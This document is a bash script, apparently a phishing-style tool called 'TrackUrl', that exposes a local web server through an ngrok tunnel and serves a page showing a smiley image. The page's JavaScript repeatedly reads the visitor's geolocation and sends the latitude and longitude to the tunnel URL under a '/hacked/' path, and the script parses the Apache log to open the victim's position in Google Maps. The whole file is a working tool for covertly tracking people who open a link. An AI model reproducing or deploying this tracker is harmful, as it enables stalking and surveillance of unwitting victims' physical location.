#!/bin/bash

#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
default="\e[0m"

# Design
function logo(){
  clear
  sleep 0.1 && echo -e "$blue "
    sleep 0.1 && echo -e "   ___  _____   _____ _ __  "
    sleep 0.1 && echo -e "  / __|/ _ \ \ / / _ \ |_ \ "
    sleep 0.1 && echo -e "  \__ \  __/\ V /  __/ | | |"
    sleep 0.1 && echo -e "  |___/\___| \_/ \___|_| |_|"
                         
        sleep 0.1 && echo -e "$default"
  echo
  echo
}

logo

# Windows and Resolution
function autoResolution {
	nx=4
	detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
	echo -ne $blue"[+] Screen Resolution ->"$default
	echo -e $detectedresolution
	screenwidth=${detectedresolution%x*}
	screenheight=${detectedresolution#*x}
	screenwidth=$(($screenwidth/(($nx*3))-8))
	screenheight=$(($screenheight/(($nx*5))-14))
	resolution="${screenwidth}x${screenheight}"
	TOPLEFT="-geometry $resolution+0+0"
	TOPRIGHT="-geometry $resolution-0+0"
	BOTTOMLEFT="-geometry $resolution+0-0"
	BOTTOMRIGHT="-geometry $resolution-0-0"
	MIDDLELEFT="-geometry  100x14+0+$screenheight"
	MIDDLERIGHT="-geometry 100x14-0+$screenheight"
}

autoResolution

xterm $TOPLEFT -T NGROK -e ngrok http 8080 -log ngrok.log &

sleep 5
echo -e $blue"[+] Geting Url from ngrok log file!"$default
varurl=$(grep url=https ngrok.log | awk '{print $8}' | cut -d "=" -f2)
echo -e $red"[+] "$varurl
echo -e $blue"Done!!!"

echo "<!DOCTYPE html>
<html>
   <head>
      <title>seven</title>
      <style type=\"text/css\">
         body {
         background-image: url(\"smile.jpg\");
         background-size: 1000px 1000px;
         background-repeat: no-repeat;
         }
      </style>
   </head>
   <body>
      <script>
         function httpGet(theUrl) {
             var xmlHttp = new XMLHttpRequest();
             xmlHttp.open( \"GET\", theUrl, false );
             xmlHttp.send( null );
             return xmlHttp.responseText;
         }

         function autoUpdate() {
           navigator.geolocation.getCurrentPosition(function(position) {
             coords = position.coords.latitude + \",\" + position.coords.longitude;
              url = \""$varurl"/hacked/\" + coords;
             httpGet(url);
             console.log('should be working');
             setTimeout(autoUpdate, 3000);
         })
         };
         autoUpdate();
      </script>
   </body>
</html>" > index.html

mv index.html /var/www/html/index.html
cp smile.jpg /var/www/html/smile.jpg
sudo service apache2 start
logo > /var/log/apache2/access.log
xterm $TOPRIGHT -T TAIL -e tail -f /var/log/apache2/access.log &

function showLatLong(){
  matchstr=$(awk '/./{line=$0} END{print line}' /var/log/apache2/access.log)
  if echo $matchstr | grep -q "hacked"; then
    latlong=$(awk '/./{line=$0} END{print line}' /var/log/apache2/access.log | awk '{print $7}' | cut -c 9- )
    gcmd="https://www.google.com/maps/?q="$latlong
    #xdg-open $gcmd
    firefox $gcmd
  fi
}

while true; do
  echo -ne $yellow"[*] (y) finnish (any) location? "$default
  read WISH

  if [ $WISH = "y" ]; then
    sudo killall xterm
    sudo service apache2 stop
    rm ngrok.log
    echo -e $red"[+] Clean up successful..."
    echo -e $red"[+] Thank you for using TrackUrl, Good Bye..."
    exit
  else
    showLatLong
  fi
done
exit
